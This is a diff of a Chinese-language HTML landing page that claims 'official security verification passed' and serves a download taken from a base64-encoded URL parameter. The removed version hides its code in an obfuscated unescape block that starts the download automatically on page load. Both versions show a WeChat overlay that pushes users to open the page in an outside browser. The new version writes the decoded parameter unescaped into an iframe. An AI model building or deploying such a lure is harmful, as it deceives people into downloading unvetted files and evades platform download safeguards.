@@ -1,5 +1,352 @@
-<script>
-<!--
-document.write(unescape("%3Chtml%20lang%3D%22zh-CN%22%3E%0A%3Chead%3E%0A%20%20%3Cmeta%20content%3D%22width%3Ddevice-width%2Cinitial-scale%3D1.0%2Cmaximum-scale%3D1.0%2Cuser-scalable%3D0%22%20name%3D%22viewport%22%3E%0A%20%20%3Cmeta%20content%3D%22yes%22%20name%3D%22apple-mobile-web-app-capable%22%3E%0A%20%20%3Cmeta%20content%3D%22yes%22%20name%3D%22apple-touch-fullscreen%22%3E%0A%20%20%3Cmeta%20content%3D%22black%22%20name%3D%22apple-mobile-web-app-status-bar-style%22%3E%0A%20%20%3Ctitle%3E%u5B98%u65B9%u5B89%u5168%u8BBF%u95EE%3C/title%3E%0A%20%20%3C%21--%20%u5F15%u5165qrcode.js%u5E93%20--%3E%0A%20%20%3Cscript%20src%3D%22https%3A//cdn.bootcdn.net/ajax/libs/qrcodejs/1.0.0/qrcode.min.js%22%3E%3C/script%3E%0A%3Cstyle%3E%0A*%20%7B%0A%20%20%20%20margin%3A%200%3B%0A%20%20%20%20padding%3A%200%3B%0A%20%20%20%20box-sizing%3A%20border-box%3B%0A%7D%0A%0A/*%20%u5168%u5C4F%u5BB9%u5668%20*/%0Abody%2C%20html%20%7B%0A%20%20%20%20width%3A%20100%25%3B%0A%20%20%20%20height%3A%20100%25%3B%0A%20%20%20%20overflow%3A%20hidden%3B%0A%7D%0A%0A.container%20%7B%0A%20%20%20%20width%3A%20100%25%3B%0A%20%20%20%20height%3A%20100vh%3B%0A%20%20%20%20background-color%3A%20%23f8f9fa%3B%0A%20%20%20%20display%3A%20flex%3B%0A%20%20%20%20flex-direction%3A%20column%3B%0A%20%20%20%20justify-content%3A%20center%3B%0A%20%20%20%20align-items%3A%20center%3B%0A%20%20%20%20padding%3A%2020px%3B%0A%7D%0A%0A/*%20%u5B89%u5168%u6807%u5FD7%20*/%0A.security-badge%20%7B%0A%20%20%20%20display%3A%20flex%3B%0A%20%20%20%20align-items%3A%20center%3B%0A%20%20%20%20margin-bottom%3A%2012px%3B%0A%7D%0A%0A.security-icon%20%7B%0A%20%20%20%20width%3A%2032px%3B%0A%20%20%20%20height%3A%2032px%3B%0A%20%20%20%20border-radius%3A%2050%25%3B%0A%20%20%20%20background-color%3A%20%2328a745%3B%0A%20%20%20%20color%3A%20white%3B%0A%20%20%20%20display%3A%20flex%3B%0A%20%20%20%20justify-content%3A%20center%3B%0A%20%20%20%20align-items%3A%20center%3B%0A%20%20%20%20font-size%3A%2018px%3B%0A%20%20%20%20font-weight%3A%20bold%3B%0A%20%20%20%20margin-right%3A%2010px%3B%0A%7D%0A%0A.security-text%20%7B%0A%20%20%20%20font-size%3A%2015px%3B%0A%20%20%20%20color%3A%20%2328a745%3B%0A%20%20%20%20font-weight%3A%20600%3B%0A%7D%0A%0A/*%20%u6807%u9898%20*/%0A.title%20%7B%0A%20%20%20%20font-size%3A%2024px%3B%0A%20%20%20%20color%3A%20%2328a745%3B%0A%20%20%20%20font-weight%3A%20bold%3B%0A%20%20%20%20margin-bottom%3A%2010px%3B%0A%20%20%20%20text-align%3A%20center%3B%0A%7D%0A%0A/*%20%u6838%u5FC3%u63D0%u793A%20*/%0A.tip%20%7B%0A%20%20%20%20color%3A%20%23dc3545%3B%0A%20%20%20%20font-size%3A%2016px%3B%0A%20%20%20%20font-weight%3A%20600%3B%0A%20%20%20%20margin%3A%2015px%200%3B%0A%20%20%20%20text-align%3A%20center%3B%0A%20%20%20%20line-height%3A%201.6%3B%0A%7D%0A%0A/*%20%u4E8C%u7EF4%u7801%u5BB9%u5668%20*/%0A.qrcode-box%20%7B%0A%20%20%20%20width%3A%20240px%3B%0A%20%20%20%20height%3A%20240px%3B%0A%20%20%20%20background%3A%20white%3B%0A%20%20%20%20padding%3A%2015px%3B%0A%20%20%20%20border-radius%3A%208px%3B%0A%20%20%20%20box-shadow%3A%200%203px%2015px%20rgba%280%2C0%2C0%2C0.1%29%3B%0A%20%20%20%20margin%3A%2010px%200%2025px%3B%0A%7D%0A%0A%23qrcode%20%7B%0A%20%20%20%20width%3A%20100%25%3B%0A%20%20%20%20height%3A%20100%25%3B%0A%7D%0A%0A/*%20%u975E%u5FAE%u4FE1%u73AF%u5883%u64CD%u4F5C%u6B65%u9AA4%20*/%0A.steps%20%7B%0A%20%20%20%20width%3A%20100%25%3B%0A%20%20%20%20max-width%3A%20300px%3B%0A%20%20%20%20margin-top%3A%2010px%3B%0A%20%20%20%20display%3A%20none%3B%0A%7D%0A%0A.step%20%7B%0A%20%20%20%20display%3A%20flex%3B%0A%20%20%20%20align-items%3A%20flex-start%3B%0A%20%20%20%20margin-bottom%3A%2012px%3B%0A%20%20%20%20font-size%3A%2015px%3B%0A%20%20%20%20color%3A%20%23343a40%3B%0A%7D%0A%0A.step-num%20%7B%0A%20%20%20%20width%3A%2024px%3B%0A%20%20%20%20height%3A%2024px%3B%0A%20%20%20%20background%3A%20%23dc3545%3B%0A%20%20%20%20color%3A%20white%3B%0A%20%20%20%20border-radius%3A%2050%25%3B%0A%20%20%20%20display%3A%20flex%3B%0A%20%20%20%20justify-content%3A%20center%3B%0A%20%20%20%20align-items%3A%20center%3B%0A%20%20%20%20font-size%3A%2013px%3B%0A%20%20%20%20margin-right%3A%2012px%3B%0A%20%20%20%20flex-shrink%3A%200%3B%0A%20%20%20%20margin-top%3A%202px%3B%0A%7D%0A%0A/*%20%u6D4F%u89C8%u5668%u4E0B%u8F7D%u63D0%u793A%20*/%0A.browser-download-tip%20%7B%0A%20%20%20%20color%3A%20%2328a745%3B%0A%20%20%20%20font-size%3A%2015px%3B%0A%20%20%20%20font-weight%3A%20600%3B%0A%20%20%20%20margin-top%3A%2020px%3B%0A%20%20%20%20text-align%3A%20center%3B%0A%20%20%20%20display%3A%20none%3B%0A%7D%0A%0A/*%20%u5FAE%u4FE1%u4E13%u5C5E%u8986%u76D6%u5C42%uFF08%u65B0%u589E%u6A21%u7CCA%u6548%u679C%uFF09%20*/%0A.wechat-overlay%20%7B%0A%20%20%20%20position%3A%20fixed%3B%0A%20%20%20%20top%3A%200%3B%0A%20%20%20%20left%3A%200%3B%0A%20%20%20%20width%3A%20100%25%3B%0A%20%20%20%20height%3A%20100%25%3B%0A%20%20%20%20/*%20%u6A21%u7CCA+%u534A%u900F%u660E%u53E0%u52A0%uFF0C%u5F3A%u5316%u805A%u7126%20*/%0A%20%20%20%20background-color%3A%20rgba%280%2C0%2C0%2C0.7%29%3B%0A%20%20%20%20backdrop-filter%3A%20blur%288px%29%3B%20/*%20%u6838%u5FC3%u6A21%u7CCA%u6548%u679C%20*/%0A%20%20%20%20-webkit-backdrop-filter%3A%20blur%288px%29%3B%20/*%20%u517C%u5BB9Safari/%u5FAE%u4FE1%u6D4F%u89C8%u5668%20*/%0A%20%20%20%20z-index%3A%209999%3B%0A%20%20%20%20display%3A%20none%3B%0A%20%20%20%20flex-direction%3A%20column%3B%0A%20%20%20%20justify-content%3A%20center%3B%0A%20%20%20%20align-items%3A%20center%3B%0A%20%20%20%20padding%3A%2030px%3B%0A%7D%0A%0A.overlay-content%20%7B%0A%20%20%20%20background-color%3A%20white%3B%0A%20%20%20%20padding%3A%2025px%3B%0A%20%20%20%20border-radius%3A%2012px%3B%0A%20%20%20%20width%3A%20100%25%3B%0A%20%20%20%20max-width%3A%20320px%3B%0A%20%20%20%20text-align%3A%20center%3B%0A%20%20%20%20/*%20%u5361%u7247%u9634%u5F71+%u8F7B%u5FAE%u653E%u5927%uFF0C%u589E%u5F3A%u5C42%u6B21%u611F%20*/%0A%20%20%20%20box-shadow%3A%200%205px%2020px%20rgba%280%2C0%2C0%2C0.2%29%3B%0A%20%20%20%20transform%3A%20scale%281.02%29%3B%0A%7D%0A%0A.overlay-title%20%7B%0A%20%20%20%20color%3A%20%23dc3545%3B%0A%20%20%20%20font-size%3A%2020px%3B%0A%20%20%20%20font-weight%3A%20bold%3B%0A%20%20%20%20margin-bottom%3A%2020px%3B%0A%20%20%20%20display%3A%20flex%3B%0A%20%20%20%20align-items%3A%20center%3B%0A%20%20%20%20justify-content%3A%20center%3B%0A%7D%0A%0A.overlay-title%3A%3Abefore%20%7B%0A%20%20%20%20content%3A%20%22%u26A0%uFE0F%22%3B%0A%20%20%20%20margin-right%3A%2010px%3B%0A%20%20%20%20font-size%3A%2024px%3B%0A%7D%0A%0A.overlay-steps%20%7B%0A%20%20%20%20text-align%3A%20left%3B%0A%20%20%20%20margin-bottom%3A%2020px%3B%0A%7D%0A%0A.overlay-step%20%7B%0A%20%20%20%20display%3A%20flex%3B%0A%20%20%20%20align-items%3A%20center%3B%0A%20%20%20%20margin-bottom%3A%2015px%3B%0A%20%20%20%20font-size%3A%2016px%3B%0A%20%20%20%20color%3A%20%23343a40%3B%0A%7D%0A%0A.overlay-step-num%20%7B%0A%20%20%20%20width%3A%2028px%3B%0A%20%20%20%20height%3A%2028px%3B%0A%20%20%20%20background%3A%20%23dc3545%3B%0A%20%20%20%20color%3A%20white%3B%0A%20%20%20%20border-radius%3A%2050%25%3B%0A%20%20%20%20display%3A%20flex%3B%0A%20%20%20%20justify-content%3A%20center%3B%0A%20%20%20%20align-items%3A%20center%3B%0A%20%20%20%20font-size%3A%2014px%3B%0A%20%20%20%20margin-right%3A%2015px%3B%0A%20%20%20%20flex-shrink%3A%200%3B%0A%7D%0A%0A.overlay-confirm%20%7B%0A%20%20%20%20background-color%3A%20%23dc3545%3B%0A%20%20%20%20color%3A%20white%3B%0A%20%20%20%20border%3A%20none%3B%0A%20%20%20%20border-radius%3A%208px%3B%0A%20%20%20%20padding%3A%2012px%200%3B%0A%20%20%20%20width%3A%20100%25%3B%0A%20%20%20%20font-size%3A%2016px%3B%0A%20%20%20%20font-weight%3A%20600%3B%0A%20%20%20%20cursor%3A%20pointer%3B%0A%20%20%20%20/*%20%u6309%u94AEhover%u6548%u679C%uFF0C%u63D0%u5347%u4EA4%u4E92%u611F%20*/%0A%20%20%20%20transition%3A%20background-color%200.3s%3B%0A%7D%0A%0A.overlay-confirm%3Ahover%20%7B%0A%20%20%20%20background-color%3A%20%23c82333%3B%0A%7D%0A%3C/style%3E%0A%3C/head%3E%0A%3Cbody%3E%0A%3Cdiv%20class%3D%22container%22%3E%0A%20%20%20%20%3C%21--%20%u5B89%u5168%u6807%u5FD7%20--%3E%0A%20%20%20%20%3Cdiv%20class%3D%22security-badge%22%3E%0A%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%22security-icon%22%3E%u2713%3C/div%3E%0A%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%22security-text%22%3E%u5B98%u65B9%u5B89%u5168%u8BA4%u8BC1%20%B7%20%u5DF2%u901A%u8FC7%u68C0%u6D4B%3C/div%3E%0A%20%20%20%20%3C/div%3E%0A%20%20%20%20%0A%20%20%20%20%3Cdiv%20class%3D%22title%22%3E%u5B98%u65B9%u5B89%u5168%u9A8C%u8BC1%u901A%u8FC7%3C/div%3E%0A%20%20%20%20%0A%20%20%20%20%3C%21--%20%u6838%u5FC3%u63D0%u793A%20--%3E%0A%20%20%20%20%3Cdiv%20class%3D%22tip%22%3E%u622A%u56FE%u4FDD%u5B58%u4E8C%u7EF4%u7801%20%u6216%20%u76F4%u63A5%u5FAE%u4FE1%u626B%u7801%u8BBF%u95EE%3C/div%3E%0A%20%20%20%20%0A%20%20%20%20%3C%21--%20%u4E8C%u7EF4%u7801%uFF08%u5F53%u524D%u9875%u9762URL%uFF0C%u81EA%u52A8%u7EE7%u627FHTTP/HTTPS%uFF09%20--%3E%0A%20%20%20%20%3Cdiv%20class%3D%22qrcode-box%22%3E%0A%20%20%20%20%20%20%20%20%3Cdiv%20id%3D%22qrcode%22%3E%3C/div%3E%0A%20%20%20%20%3C/div%3E%0A%20%20%20%20%0A%20%20%20%20%3C%21--%20%u975E%u5FAE%u4FE1%u73AF%u5883%u64CD%u4F5C%u6B65%u9AA4%20--%3E%0A%20%20%20%20%3Cdiv%20class%3D%22steps%22%20id%3D%22normalSteps%22%3E%0A%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%22step%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%22step-num%22%3E1%3C/div%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%22step-text%22%3E%u622A%u56FE%u4FDD%u5B58%u4E8C%u7EF4%u7801%20%u6216%20%u76F4%u63A5%u626B%u7801%u8BBF%u95EE%3C/div%3E%0A%20%20%20%20%20%20%20%20%3C/div%3E%0A%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%22step%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%22step-num%22%3E2%3C/div%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%22step-text%22%3E%u6D4F%u89C8%u5668%u81EA%u52A8%u542F%u52A8%u4E0B%u8F7D%uFF0C%u65E0%u9700%u989D%u5916%u64CD%u4F5C%3C/div%3E%0A%20%20%20%20%20%20%20%20%3C/div%3E%0A%20%20%20%20%3C/div%3E%0A%20%20%20%20%0A%20%20%20%20%3C%21--%20%u6D4F%u89C8%u5668%u4E0B%u8F7D%u63D0%u793A%20--%3E%0A%20%20%20%20%3Cdiv%20class%3D%22browser-download-tip%22%20id%3D%22browserDownloadTip%22%3E%0A%20%20%20%20%20%20%20%20%u6B63%u5728%u81EA%u52A8%u4E0B%u8F7D%uFF0C%u82E5%u672A%u4E0B%u8F7D%u6210%u529F%uFF0C%u8BF7%u626B%u7801%u4E0B%u8F7D...%0A%20%20%20%20%3C/div%3E%0A%3C/div%3E%0A%0A%3C%21--%20%u5FAE%u4FE1%u4E13%u5C5E%u8986%u76D6%u5C42%20--%3E%0A%3Cdiv%20class%3D%22wechat-overlay%22%20id%3D%22wechatOverlay%22%3E%0A%20%20%20%20%3Cdiv%20class%3D%22overlay-content%22%3E%0A%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%22overlay-title%22%3E%u5FAE%u4FE1%u5185%u65E0%u6CD5%u4E0B%u8F7D%uFF01%3C/div%3E%0A%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%22overlay-steps%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%22overlay-step%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%22overlay-step-num%22%3E1%3C/div%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%22overlay-step-text%22%3E%u70B9%u51FB%u53F3%u4E0A%u89D2%u300C%B7%B7%B7%u300D%u56FE%u6807%3C/div%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3C/div%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%22overlay-step%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%22overlay-step-num%22%3E2%3C/div%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%22overlay-step-text%22%3E%u9009%u62E9%u300C%u5728%u6D4F%u89C8%u5668%u6253%u5F00%u300D%3C/div%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3C/div%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%22overlay-step%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%22overlay-step-num%22%3E3%3C/div%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%22overlay-step-text%22%3E%u6D4F%u89C8%u5668%u81EA%u52A8%u4E0B%u8F7D%uFF0C%u65E0%u9700%u989D%u5916%u64CD%u4F5C%3C/div%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3C/div%3E%0A%20%20%20%20%20%20%20%20%3C/div%3E%0A%20%20%20%20%20%20%20%0A%20%20%20%20%3C/div%3E%0A%3C/div%3E%0A%0A%3Cscript%3E%0A//%20%u89E3%u7801%u76EE%u6807URL%uFF08%u6838%u5FC3%u903B%u8F91%uFF09%0Afunction%20getTargetUrl%28%29%20%7B%0A%20%20%20%20try%20%7B%0A%20%20%20%20%20%20%20%20const%20urlParams%20%3D%20new%20URLSearchParams%28window.location.search%29%3B%0A%20%20%20%20%20%20%20%20const%20encoded%20%3D%20urlParams.get%28%27c%27%29%3B%0A%20%20%20%20%20%20%20%20if%20%28%21encoded%29%20throw%20new%20Error%28%27%u65E0%u8BBF%u95EE%u53C2%u6570%27%29%3B%0A%20%20%20%20%20%20%20%20const%20url%20%3D%20atob%28encoded.replace%28/-/g%2C%20%27+%27%29.replace%28/_/g%2C%20%27/%27%29%29%3B%0A%20%20%20%20%20%20%20%20new%20URL%28url%29%3B%0A%20%20%20%20%20%20%20%20return%20url%3B%0A%20%20%20%20%7D%20catch%20%28e%29%20%7B%0A%20%20%20%20%20%20%20%20alert%28%27%u94FE%u63A5%u65E0%u6548%uFF0C%u8BF7%u68C0%u67E5%u540E%u91CD%u8BD5%27%29%3B%0A%20%20%20%20%20%20%20%20return%20null%3B%0A%20%20%20%20%7D%0A%7D%0A%0A//%20%u751F%u6210%u5F53%u524D%u9875%u9762%u4E8C%u7EF4%u7801%0Afunction%20initQrcode%28%29%20%7B%0A%20%20%20%20try%20%7B%0A%20%20%20%20%20%20%20%20new%20QRCode%28document.getElementById%28%27qrcode%27%29%2C%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20text%3A%20window.location.href%2C%20//%20%u81EA%u52A8%u7EE7%u627FHTTP/HTTPS%0A%20%20%20%20%20%20%20%20%20%20%20%20width%3A%20210%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20height%3A%20210%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20colorDark%3A%20%27%23000%27%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20colorLight%3A%20%27%23fff%27%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20correctLevel%3A%20QRCode.CorrectLevel.H%0A%20%20%20%20%20%20%20%20%7D%29%3B%0A%20%20%20%20%7D%20catch%20%28e%29%20%7B%0A%20%20%20%20%20%20%20%20document.getElementById%28%27qrcode%27%29.innerHTML%20%3D%20%27%3Cdiv%20style%3D%22color%3A%23dc3545%3Bfont-size%3A14px%3Btext-align%3Acenter%3Bline-height%3A210px%3B%22%3E%u4E8C%u7EF4%u7801%u751F%u6210%u5931%u8D25%3C/div%3E%27%3B%0A%20%20%20%20%7D%0A%7D%0A%0A//%20%u68C0%u6D4B%u5FAE%u4FE1%u6D4F%u89C8%u5668%0Afunction%20isWechatBrowser%28%29%20%7B%0A%20%20%20%20return%20navigator.userAgent.toLowerCase%28%29.includes%28%27micromessenger%27%29%3B%0A%7D%0A%0A//%20%u9690%u85CF%u5FAE%u4FE1%u8986%u76D6%u5C42%0Afunction%20hideOverlay%28%29%20%7B%0A%20%20%20%20document.getElementById%28%27wechatOverlay%27%29.style.display%20%3D%20%27none%27%3B%0A%7D%0A%0A//%20%u975E%u5FAE%u4FE1%u73AF%u5883%u81EA%u52A8%u4E0B%u8F7D%0Afunction%20autoDownloadInBrowser%28%29%20%7B%0A%20%20%20%20if%20%28isWechatBrowser%28%29%29%20%7B%0A%20%20%20%20%20%20%20%20document.getElementById%28%27wechatOverlay%27%29.style.display%20%3D%20%27flex%27%3B%0A%20%20%20%20%20%20%20%20return%3B%0A%20%20%20%20%7D%0A%20%20%20%20%0A%20%20%20%20document.getElementById%28%27browserDownloadTip%27%29.style.display%20%3D%20%27block%27%3B%0A%20%20%20%20document.getElementById%28%27normalSteps%27%29.style.display%20%3D%20%27block%27%3B%0A%20%20%20%20const%20targetUrl%20%3D%20getTargetUrl%28%29%3B%0A%20%20%20%20if%20%28%21targetUrl%29%20return%3B%0A%20%20%20%20%0A%20%20%20%20try%20%7B%0A%20%20%20%20%20%20%20%20const%20a%20%3D%20document.createElement%28%27a%27%29%3B%0A%20%20%20%20%20%20%20%20a.href%20%3D%20targetUrl%3B%0A%20%20%20%20%20%20%20%20a.download%20%3D%20%27%27%3B%0A%20%20%20%20%20%20%20%20document.body.appendChild%28a%29%3B%0A%20%20%20%20%20%20%20%20a.click%28%29%3B%0A%20%20%20%20%20%20%20%20document.body.removeChild%28a%29%3B%0A%20%20%20%20%7D%20catch%20%28e%29%20%7B%0A%20%20%20%20%20%20%20%20window.location.href%20%3D%20targetUrl%3B%0A%20%20%20%20%7D%0A%7D%0A%0A//%20%u521D%u59CB%u5316%0Awindow.onload%20%3D%20function%28%29%20%7B%0A%20%20%20%20initQrcode%28%29%3B%0A%20%20%20%20autoDownloadInBrowser%28%29%3B%0A%7D%3B%0A%3C/script%3E%0A%3C/body%3E%0A%3C/html%3E"));
-//-->
-</script>
+<html lang="zh-CN">
+<head>
+  <meta content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=0" name="viewport">
+  <meta content="yes" name="apple-mobile-web-app-capable">
+  <meta content="yes" name="apple-touch-fullscreen">
+  <meta content="black" name="apple-mobile-web-app-status-bar-style">
+  <title>官方认证-安全访问</title>
+  <!-- 引入二维码生成库 -->
+  <script src="https://cdn.bootcdn.net/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    body, html {
+      width: 100%;
+      height: 100%;
+      overflow: hidden;
+      background-color: #fff;
+    }
+
+    /* 主容器 - 完全居中 */
+    .container {
+      width: 100%;
+      height: 100%;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      padding: 20px;
+      text-align: center;
+    }
+
+    /* 安全标志 */
+    .security-badge {
+      display: flex;
+      align-items: center;
+      margin-bottom: 10px;
+    }
+
+    .security-icon {
+      width: 32px;
+      height: 32px;
+      border-radius: 50%;
+      background-color: #28a745;
+      color: white;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      font-size: 18px;
+      margin-right: 8px;
+    }
+
+    .security-subtext {
+      font-size: 14px;
+      color: #28a745;
+    }
+
+    /* 主标题 */
+    .main-title {
+      font-size: 22px;
+      color: #28a745;
+      font-weight: bold;
+      margin: 15px 0;
+    }
+
+    /* 二维码提示 */
+    .qrcode-desc {
+      font-size: 15px;
+      color: #666;
+      margin-bottom: 20px;
+      line-height: 1.5;
+    }
+
+    /* 二维码容器 - 居中显示 */
+    .qrcode-box {
+      width: 240px;
+      height: 240px;
+      background: white;
+      padding: 15px;
+      border-radius: 8px;
+      box-shadow: 0 3px 10px rgba(0,0,0,0.1);
+      margin-bottom: 25px;
+    }
+
+    #qrcode {
+      width: 100%;
+      height: 100%;
+    }
+
+    /* 操作步骤 */
+    .steps {
+      width: 100%;
+      max-width: 300px;
+      margin-bottom: 20px;
+    }
+
+    .step {
+      display: flex;
+      align-items: flex-start;
+      margin-bottom: 12px;
+      font-size: 14px;
+      color: #333;
+    }
+
+    .step-num {
+      width: 22px;
+      height: 22px;
+      background: #28a745;
+      color: white;
+      border-radius: 50%;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      font-size: 12px;
+      margin-right: 10px;
+      flex-shrink: 0;
+      margin-top: 1px;
+    }
+
+    /* 浏览器下载提示 */
+    .browser-tip {
+      color: #28a745;
+      font-size: 15px;
+      font-weight: 500;
+      display: none;
+    }
+
+    /* 微信遮罩层 */
+    .wechat-overlay {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0,0,0,0.7);
+      backdrop-filter: blur(8px);
+      -webkit-backdrop-filter: blur(8px);
+      z-index: 9999;
+      display: none;
+      justify-content: center;
+      align-items: center;
+      padding: 20px;
+    }
+
+    .overlay-content {
+      background: white;
+      padding: 20px;
+      border-radius: 10px;
+      max-width: 300px;
+      width: 100%;
+    }
+
+    .overlay-title {
+      color: #dc3545;
+      font-size: 18px;
+      font-weight: bold;
+      margin-bottom: 15px;
+      text-align: center;
+    }
+
+    .overlay-step {
+      display: flex;
+      margin-bottom: 10px;
+      font-size: 14px;
+    }
+
+    .overlay-step-num {
+      width: 24px;
+      height: 24px;
+      background: #dc3545;
+      color: white;
+      border-radius: 50%;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      margin-right: 10px;
+      flex-shrink: 0;
+    }
+
+    .overlay-confirm {
+      background: #dc3545;
+      color: white;
+      border: none;
+      border-radius: 6px;
+      padding: 10px 0;
+      width: 100%;
+      margin-top: 15px;
+      font-size: 15px;
+      cursor: pointer;
+    }
+
+    /* iframe容器 */
+    .content {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      z-index: 1;
+      border: 0;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <!-- 安全标志 -->
+    <div class="security-badge">
+      <div class="security-icon">✓</div>
+      <div class="main-title">官方安全验证通过</div>
+    </div>
+
+    <!-- 二维码提示 -->
+    <div class="qrcode-desc">截图保存二维码 或 直接微信扫码访问</div>
+
+    <!-- 二维码容器 -->
+    <div class="qrcode-box">
+      <div id="qrcode"></div>
+    </div>
+
+    <!-- 操作步骤 -->
+    <div class="steps">
+      <div class="step">
+        <div class="step-num">1</div>
+        <div>截图保存二维码 或 直接扫码访问</div>
+      </div>
+      <div class="step">
+        <div class="step-num">2</div>
+        <div>浏览器自动启动下载，无需额外操作</div>
+      </div>
+    </div>
+
+    <!-- 浏览器下载提示 -->
+    <div class="browser-tip" id="browserTip">已在浏览器打开，正在自动下载...</div>
+  </div>
+
+  <!-- 微信遮罩层 -->
+  <div class="wechat-overlay" id="wechatOverlay">
+    <div class="overlay-content">
+      <div class="overlay-title">微信内无法直接下载</div>
+      <div class="overlay-step">
+        <div class="overlay-step-num">1</div>
+        <div>点击右上角「···」图标</div>
+      </div>
+      <div class="overlay-step">
+        <div class="overlay-step-num">2</div>
+        <div>选择「在浏览器打开」</div>
+      </div>
+      <button class="overlay-confirm" onclick="hideWechatOverlay()">知道了</button>
+    </div>
+  </div>
+
+  <script>
+    // 检测微信浏览器
+    function isWechatBrowser() {
+      return navigator.userAgent.toLowerCase().includes('micromessenger');
+    }
+
+    // 隐藏微信遮罩层
+    function hideWechatOverlay() {
+      document.getElementById('wechatOverlay').style.display = 'none';
+    }
+
+    // 生成二维码
+    function initQrcode() {
+      try {
+        new QRCode(document.getElementById('qrcode'), {
+          text: window.location.href,
+          width: 210,
+          height: 210,
+          colorDark: '#000',
+          colorLight: '#fff',
+          correctLevel: QRCode.CorrectLevel.H
+        });
+      } catch (e) {
+        document.getElementById('qrcode').innerHTML = '<div style="color:#f00;font-size:14px;text-align:center;line-height:210px;">二维码生成失败</div>';
+      }
+    }
+
+    // 解析参数并处理下载
+    (function() {
+      const urlParams = new URLSearchParams(window.location.search);
+      const encodedParam = urlParams.get('c');
+      const tureurl = encodedParam ? atob(encodedParam) : '';
+
+      // 初始化二维码
+      initQrcode();
+
+      // 微信环境处理
+      if (isWechatBrowser()) {
+        document.getElementById('wechatOverlay').style.display = 'flex';
+      } else {
+        // 非微信环境显示下载提示
+        document.getElementById('browserTip').style.display = 'block';
+      }
+
+      // 加载下载链接
+      if (tureurl && tureurl.includes('http')) {
+        const html = `<iframe class="content" onload="bindMouseWhee(this)" src="${tureurl}"></iframe>`;
+        document.writeln(html);
+      }
+    })();
+  </script>
+
+  <!-- 鼠标滚轮事件处理 -->
+  <script>
+    var firefox = navigator.userAgent.indexOf('Firefox') != -1;
+
+    function MouseWheel(e, doc) {
+      try {
+        e.preventDefault && e.preventDefault();
+        e.returnValue = false;
+        var up = firefox && e.detail < 0 || e.wheelDelta > 0;
+        doc.body.scrollTop = doc.documentElement.scrollTop += up ? -50 : 50;
+      } catch (e) {
+        console.log('跨域环境下无法控制滚动:', e);
+      }
+    }
+
+    function bindMouseWhee(ifr) {
+      try {
+        var isSameOrigin = false;
+        try {
+          var iframeOrigin = new URL(ifr.src).origin;
+          isSameOrigin = window.location.origin === iframeOrigin;
+        } catch (e) {
+          console.log('无法验证同源性:', e);
+        }
+
+        if (isSameOrigin) {
+          var doc = ifr.contentWindow.document;
+          if (firefox) {
+            doc.addEventListener('DOMMouseScroll', function(e) {
+              MouseWheel(e, doc);
+            }, false);
+          } else {
+            doc.onmousewheel = function(e) {
+              MouseWheel(e || ifr.contentWindow.event, doc);
+            };
+          }
+        } else {
+          console.log('检测到跨域iframe，不绑定滚动事件');
+        }
+      } catch (e) {
+        console.log('绑定滚动事件失败:', e);
+      }
+    }
+  </script>
+</body>
+</html>
